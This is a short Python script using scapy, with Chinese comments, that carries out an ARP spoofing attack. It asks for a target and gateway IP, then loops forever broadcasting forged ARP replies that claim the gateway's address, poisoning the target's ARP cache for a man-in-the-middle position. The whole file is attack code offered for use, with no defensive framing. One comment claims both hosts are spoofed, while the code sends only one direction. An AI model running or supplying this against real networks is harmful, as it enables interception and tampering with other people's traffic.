import sys
from scapy.all import ARP, Ether, sendp

# 获取目标IP和网关IP地址
target_ip = input("请输入目标IP地址: ")
gateway_ip = input("请输入网关IP地址: ")

# 构造ARP请求包并发送到目标IP和网关IP
packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
sendp(packet)

# 持续进行ARP欺骗攻击
while True:
    try:
        # 发送伪造的ARP响应包给目标IP和网关IP，告诉他们自己就是对方
        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
        sendp(packet)
        print(f"已发送ARP欺骗攻击至 {target_ip} 和 {gateway_ip}")
    except KeyboardInterrupt:
        # 如果用户按下Ctrl-C，则退出程序
        print("用户中断程序")
        sys.exit(0)
